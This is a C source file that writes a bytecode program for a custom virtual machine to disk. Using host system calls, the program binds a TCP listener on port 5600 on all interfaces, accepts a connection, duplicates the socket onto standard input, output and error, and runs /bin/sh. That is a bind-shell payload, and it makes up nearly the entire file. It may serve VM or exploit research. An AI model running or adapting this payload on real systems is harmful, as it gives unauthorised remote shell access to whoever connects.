#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <netinet/in.h>
#include "src/vm/iset.h"

//socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
//mmap(NULL, 16, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f510781d000
//bind(3, {sa_family=AF_INET, sin_port=htons(5600), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
//listen(3, 0)                            = 0
//accept(3, 0x0, 0x10)                   = 4
//dup2(4, 2)                              = 2
//dup2(4, 1)                              = 1
//dup2(4, 0)                              = 0
//execve("/bin//sh", 0x0, 0x0)          = 0

int64_t PROGRAM[] = {
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x1,
    VM_ISET_PUSH, 0x2,
    VM_ISET_HOSTCALL, 0x29,
    VM_ISET_STORE, 0x9,

    VM_ISET_PUSH, 0x0000,
    VM_ISET_PUSH, -1,
    VM_ISET_PUSH, (MAP_PRIVATE | MAP_ANONYMOUS),
    VM_ISET_PUSH, (PROT_WRITE | PROT_READ),
    VM_ISET_PUSH, sizeof(struct sockaddr),
    VM_ISET_PUSH, 0x0000,
    VM_ISET_HOSTCALL, 0x0009,
    VM_ISET_STORE, 0x0010,

    VM_ISET_LOAD, 0x0010,
    VM_ISET_STORE, 0x0001,

    VM_ISET_LOAD, 0x0001,
    VM_ISET_PUSH, 0x0002,
    VM_ISET_PUSH, sizeof(sa_family_t),
    VM_ISET_HOSTWRITE, VM_ISET_NOP,

    VM_ISET_LOAD, 0x0001,
    VM_ISET_PUSH, sizeof(sa_family_t),
    VM_ISET_ADD, VM_ISET_NOP,
    VM_ISET_PUSH, 0xe015,
    VM_ISET_PUSH, sizeof(in_port_t),
    VM_ISET_HOSTWRITE, VM_ISET_NOP,

    VM_ISET_LOAD, 0x0001,
    VM_ISET_PUSH, sizeof(sa_family_t),
    VM_ISET_ADD, VM_ISET_NOP,
    VM_ISET_PUSH, sizeof(in_port_t),
    VM_ISET_ADD, VM_ISET_NOP,
    VM_ISET_PUSH, 0x0000,
    VM_ISET_PUSH, sizeof(struct in_addr),
    VM_ISET_HOSTWRITE, VM_ISET_NOP,

    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x10,
    VM_ISET_LOAD, 0x10,
    VM_ISET_LOAD, 0x9,
    VM_ISET_HOSTCALL, 0x31,

    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_LOAD, 0x9,
    VM_ISET_HOSTCALL, 0x32,

    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x10,
    VM_ISET_PUSH, 0x0,
    VM_ISET_LOAD, 0x9,
    VM_ISET_HOSTCALL, 0x2b,

    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x2,
    VM_ISET_PUSH, 0x4,
    VM_ISET_HOSTCALL, 0x21,

    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x1,
    VM_ISET_PUSH, 0x4,
    VM_ISET_HOSTCALL, 0x21,

    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x4,
    VM_ISET_HOSTCALL, 0x21,

    VM_ISET_LOAD, 0x0001,
    VM_ISET_PUSH, 0x68732f2f6e69622f,
    VM_ISET_PUSH, 0x8,
    VM_ISET_HOSTWRITE, VM_ISET_NOP,

    VM_ISET_LOAD, 0x0001,
    VM_ISET_PUSH, 0x8,
    VM_ISET_ADD, VM_ISET_NOP,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x1,
    VM_ISET_HOSTWRITE, VM_ISET_NOP,

    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_PUSH, 0x0,
    VM_ISET_LOAD, 0x10,
    VM_ISET_HOSTCALL, 0x3b,

    VM_ISET_HALT, VM_ISET_NOP
};

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <file>\n", argv[0]);
        return 1;
    }

    //Open file to write the buffer
    FILE* f = fopen(argv[1], "wb");
    if (!f) {
        printf("Failed to open file %s\n", argv[1]);
        return 1;
    }

    //Write the buffer
    fwrite(PROGRAM, sizeof(PROGRAM), 1, f);
    fclose(f);
}